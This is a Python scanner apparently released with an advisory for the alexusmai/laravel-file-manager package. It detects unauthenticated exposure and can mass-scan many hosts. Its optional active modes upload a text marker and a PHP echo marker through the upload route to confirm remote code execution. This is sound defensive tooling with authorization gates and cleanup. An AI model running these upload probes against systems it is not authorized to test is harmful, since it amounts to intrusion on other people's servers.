#!/usr/bin/env python3
"""
lfm_scanner.py — exposure scanner for alexusmai/laravel-file-manager
(advisory LFM-2026-ADV-01).

Checks whether one URL, or a list of URLs, exposes the file-manager component
with an insecure configuration (unauthenticated reach, ACL disabled, public
disk). It answers the question "is this install exposed/vulnerable?" WITHOUT
exploiting it.

Authorization
-------------
Only run this against systems you own or are explicitly authorized in writing to
test. The author is not responsible for misuse.

Detection tiers
---------------
  PASSIVE (default)
    One request per host: GET /<prefix>/initialize. From the response it reads
    whether the endpoint is reachable unauthenticated and what it reports
    (acl flag, disk list). Nothing is written. This is enough to classify most
    hosts.

  --active            (requires --authorized)
    Uploads a single INERT probe: a .txt file whose body is a random marker.
    It proves the unrestricted-upload + public-read primitive by fetching the
    marker back. It is NOT executable and contains no code. The probe is
    deleted afterwards via the package's delete route when available.

  --confirm-exec      (implies --active; requires --authorized)
    Additionally uploads a minimal inert PHP marker ( <?php echo "<marker>"; )
    to confirm the host actually EXECUTES PHP under the storage path. It takes
    no parameters and runs no commands — it cannot be used as a web shell — and
    it is deleted afterwards. Use only where a full confirmation is required and
    authorized. This is the only tier that writes an executing file.

Verdicts
--------
  NOT_DETECTED      endpoint not present / not the component
  AUTH_REQUIRED     component present but gated (redirect/401/403) — lower risk
  EXPOSED_UNAUTH    initialize reachable without auth (acl/disks reported)
  UPLOAD_CONFIRMED  --active: inert file was written and read back publicly
  EXEC_CONFIRMED    --confirm-exec: inert PHP marker executed (RCE-grade exposure)
  ERROR             network/parse error (see note)
"""
import argparse
import concurrent.futures
import csv
import http.cookiejar
import io
import json
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "lfm-exposure-scanner/1.0 (+security-research; authorized use only)"
DEFAULT_PREFIXES = ["file-manager", "filemanager", "admin/file-manager", "laravel-filemanager"]
TIMEOUT = 15


# ---------------------------------------------------------------------------
# HTTP helpers (stdlib only, isolated cookie jar per host)
# ---------------------------------------------------------------------------
def make_opener():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        NoRedirect(),
    )
    opener.addheaders = [("User-Agent", UA)]
    return opener, jar


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # surface 3xx instead of following (auth gates redirect)


def cookie_value(jar, name):
    for c in jar:
        if c.name == name:
            return c.value
    return None


def do(opener, url, data=None, headers=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with opener.open(req, timeout=TIMEOUT) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:  # noqa: BLE001 — report, don't crash the batch
        return None, {"_error": str(e)}, b""


def multipart(fields, files):
    boundary = "----lfm" + secrets.token_hex(12)
    body = io.BytesIO()
    for k, v in fields.items():
        body.write(f"--{boundary}\r\n".encode())
        body.write(f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode())
    for field, filename, ctype, content in files:
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
        )
        body.write(f"Content-Type: {ctype}\r\n\r\n".encode())
        body.write(content + b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    return body.getvalue(), f"multipart/form-data; boundary={boundary}"


# ---------------------------------------------------------------------------
# Scan logic
# ---------------------------------------------------------------------------
def normalize(url):
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def looks_like_component(status, body):
    """initialize returns JSON with a 'result'/'config' shape."""
    if status != 200:
        return False, None
    try:
        info = json.loads(body)
    except (json.JSONDecodeError, ValueError):
        return False, None
    if isinstance(info, dict) and ("config" in info or "result" in info):
        return True, info
    return False, None


def passive_probe(base, prefixes):
    """Return (verdict, detail dict). One GET per prefix until one matches."""
    opener, jar = make_opener()
    for prefix in prefixes:
        url = f"{base}/{prefix}/initialize"
        status, headers, body = do(opener, url)
        if status is None:
            # transport error only matters if every prefix fails; keep last
            last_err = headers.get("_error")
            continue
        last_err = None
        is_comp, info = looks_like_component(status, body)
        if is_comp:
            cfg = (info or {}).get("config", {}) or {}
            disks = cfg.get("disks", {})
            detail = {
                "prefix": prefix,
                "status": status,
                "acl": cfg.get("acl"),
                "disks": list(disks) if isinstance(disks, (dict, list)) else disks,
                "leftDisk": cfg.get("leftDisk"),
                "xsrf": cookie_value(jar, "XSRF-TOKEN") is not None,
            }
            return "EXPOSED_UNAUTH", detail, opener, jar
        loc = headers.get("Location", "")
        # Only count as "gated component" on a genuine auth signal, not any 3xx
        # (a plain redirect to the homepage from an unrelated host is not evidence).
        if status in (401, 403) or (
            status in (301, 302, 303, 307, 308) and "login" in loc.lower()
        ):
            return "AUTH_REQUIRED", {"prefix": prefix, "status": status, "location": loc}, opener, jar
    if last_err:
        return "ERROR", {"error": last_err}, opener, jar
    return "NOT_DETECTED", {}, opener, jar


def active_probe(base, prefix, opener, jar, disk, exec_test):
    """
    Non-destructive write/read probe. Returns (verdict, detail).
    Uploads an inert marker, reads it back, deletes it. Only when exec_test is
    set does it upload an inert <?php echo marker to confirm execution.
    """
    xsrf = cookie_value(jar, "XSRF-TOKEN")
    if not xsrf:
        # refresh token
        do(opener, f"{base}/{prefix}/initialize")
        xsrf = cookie_value(jar, "XSRF-TOKEN")
    token = urllib.parse.unquote(xsrf) if xsrf else ""
    marker = "LFMSCAN-" + secrets.token_hex(8)

    def upload(name, ctype, content):
        data, ct = multipart(
            {"disk": disk, "path": "", "overwrite": "1"},
            [("files[]", name, ctype, content)],
        )
        return do(
            opener,
            f"{base}/{prefix}/upload",
            data=data,
            headers={"X-XSRF-TOKEN": token, "Content-Type": ct, "Accept": "application/json"},
        )

    def delete(name):
        for payload in (
            json.dumps({"disk": disk, "items": [{"path": name, "type": "file"}]}),
            urllib.parse.urlencode({"disk": disk, "items[0][path]": name, "items[0][type]": "file"}),
        ):
            is_json = payload.startswith("{")
            do(
                opener,
                f"{base}/{prefix}/delete",
                data=payload.encode(),
                headers={
                    "X-XSRF-TOKEN": token,
                    "Content-Type": "application/json" if is_json else "application/x-www-form-urlencoded",
                    "Accept": "application/json",
                },
            )

    # Tier A: inert text marker (no code)
    txt_name = marker + ".txt"
    st, _, b = upload(txt_name, "text/plain", marker.encode())
    detail = {"upload_status": st, "upload_body": b[:160].decode(errors="replace")}
    if st != 200:
        return "EXPOSED_UNAUTH", detail  # reachable but write rejected (restricted/auth)

    read_st, _, read_b = do(opener, f"{base}/storage/{urllib.parse.quote(txt_name)}")
    wrote_and_read = read_st == 200 and marker.encode() in read_b
    detail["read_status"] = read_st

    if not wrote_and_read:
        delete(txt_name)
        return "EXPOSED_UNAUTH", detail  # stored but not web-readable as public

    if not exec_test:
        delete(txt_name)
        return "UPLOAD_CONFIRMED", detail

    # Tier B: inert PHP marker — echoes a static string, no params, no commands.
    php_name = marker + ".php"
    exec_marker = "LFMEXEC-" + secrets.token_hex(6)
    php_body = f'<?php echo "{exec_marker}";'.encode()
    st2, _, _ = upload(php_name, "application/x-php", php_body)
    detail["php_upload_status"] = st2
    executed = False
    if st2 == 200:
        ex_st, _, ex_b = do(opener, f"{base}/storage/{urllib.parse.quote(php_name)}")
        detail["php_read_status"] = ex_st
        executed = ex_st == 200 and exec_marker.encode() in ex_b and php_body not in ex_b
    delete(txt_name)
    delete(php_name)
    return ("EXEC_CONFIRMED" if executed else "UPLOAD_CONFIRMED"), detail


def scan_one(url, args):
    base = normalize(url)
    prefixes = args.prefix.split(",") if args.prefix else DEFAULT_PREFIXES
    verdict, detail, opener, jar = passive_probe(base, prefixes)

    if verdict == "EXPOSED_UNAUTH" and args.active:
        if detail.get("acl") is True and not args.ignore_acl:
            detail["note"] = "acl=true; active probe skipped (use --ignore-acl to force)"
        else:
            disk = args.disk or (detail.get("disks") or ["public"])[0] or "public"
            verdict, adet = active_probe(
                base, detail["prefix"], opener, jar, disk, args.confirm_exec
            )
            detail.update(adet)
    return {"url": base, "verdict": verdict, **detail}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
RISK = {
    "EXEC_CONFIRMED": "CRITICAL",
    "UPLOAD_CONFIRMED": "CRITICAL",
    "EXPOSED_UNAUTH": "HIGH",
    "AUTH_REQUIRED": "LOW",
    "NOT_DETECTED": "-",
    "ERROR": "-",
}


def read_targets(args):
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        with open(args.list, encoding="utf-8") as fh:
            targets += [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
    if not targets and not sys.stdin.isatty():
        targets += [ln.strip() for ln in sys.stdin if ln.strip() and not ln.startswith("#")]
    # de-dup, keep order
    seen, out = set(), []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


def main():
    p = argparse.ArgumentParser(
        description="Exposure scanner for alexusmai/laravel-file-manager (LFM-2026-ADV-01).",
        epilog="Authorized use only. Passive by default; --active/--confirm-exec write test files.",
    )
    src = p.add_argument_group("targets")
    src.add_argument("--url", help="single target (host or URL)")
    src.add_argument("--list", help="file with one target per line (# comments allowed)")
    scan = p.add_argument_group("scan")
    scan.add_argument("--prefix", help="comma-separated route prefixes to try "
                                       f"(default: {','.join(DEFAULT_PREFIXES)})")
    scan.add_argument("--disk", help="disk name for the active probe (default: first reported)")
    scan.add_argument("--active", action="store_true",
                      help="inert write/read probe (requires --authorized)")
    scan.add_argument("--confirm-exec", action="store_true",
                      help="also confirm PHP execution with an inert marker (implies --active)")
    scan.add_argument("--ignore-acl", action="store_true",
                      help="run the active probe even when acl=true is reported")
    scan.add_argument("--authorized", action="store_true",
                      help="assert you are authorized to actively test these targets")
    scan.add_argument("--threads", type=int, default=8, help="concurrent hosts (default 8)")
    scan.add_argument("--delay", type=float, default=0.0, help="seconds between requests per worker")
    scan.add_argument("--timeout", type=int, default=15, help="per-request timeout seconds")
    out = p.add_argument_group("output")
    out.add_argument("--json", action="store_true", help="JSON lines output")
    out.add_argument("--csv", help="write results to CSV file")
    out.add_argument("--only-vuln", action="store_true", help="print only exposed/confirmed hosts")
    args = p.parse_args()

    global TIMEOUT
    TIMEOUT = args.timeout
    if args.confirm_exec:
        args.active = True
    if args.active and not args.authorized:
        p.error("--active/--confirm-exec require --authorized "
                "(you assert written authorization to actively test the targets)")

    targets = read_targets(args)
    if not targets:
        p.error("no targets (use --url, --list, or pipe URLs on stdin)")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(scan_one, t, args): t for t in targets}
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            results.append(r)
            if args.delay:
                time.sleep(args.delay)
            vulnish = r["verdict"] in ("EXPOSED_UNAUTH", "UPLOAD_CONFIRMED", "EXEC_CONFIRMED")
            if args.only_vuln and not vulnish:
                continue
            if args.json:
                print(json.dumps(r, ensure_ascii=False))
            else:
                extra = []
                if "acl" in r:
                    extra.append(f"acl={r.get('acl')}")
                if r.get("disks"):
                    extra.append(f"disks={r['disks']}")
                print(f"[{RISK.get(r['verdict'],'-'):>8}] {r['verdict']:<16} {r['url']}"
                      + (("  " + " ".join(extra)) if extra else ""))

    if args.csv:
        keys = sorted({k for r in results for k in r})
        with open(args.csv, "w", newline="", encoding="utf-8") as fh:
            w = csv.DictWriter(fh, fieldnames=keys)
            w.writeheader()
            for r in results:
                w.writerow(r)

    # summary to stderr, exit code reflects findings
    counts = {}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    print("summary: " + ", ".join(f"{k}={v}" for k, v in sorted(counts.items())), file=sys.stderr)
    exposed = any(r["verdict"] in ("EXPOSED_UNAUTH", "UPLOAD_CONFIRMED", "EXEC_CONFIRMED")
                  for r in results)
    return 2 if exposed else 0


if __name__ == "__main__":
    sys.exit(main())
